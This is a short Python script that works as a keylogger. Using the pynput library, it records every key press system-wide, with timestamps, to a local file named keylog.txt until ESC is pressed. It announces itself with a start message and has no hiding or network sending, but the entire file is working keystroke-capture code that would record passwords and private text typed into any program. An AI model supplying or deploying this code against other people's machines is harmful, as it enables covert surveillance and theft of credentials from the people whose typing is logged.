from pynput import keyboard
import logging
import os

# Setup logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        log_message = f'Key {key.char} pressed'
    except AttributeError:
        log_message = f'Special key {key} pressed'
    logging.info(log_message)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Print start message
print(f"Keylogger started. Logging to {os.path.abspath(log_file)}")
print("Press ESC to stop.")

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
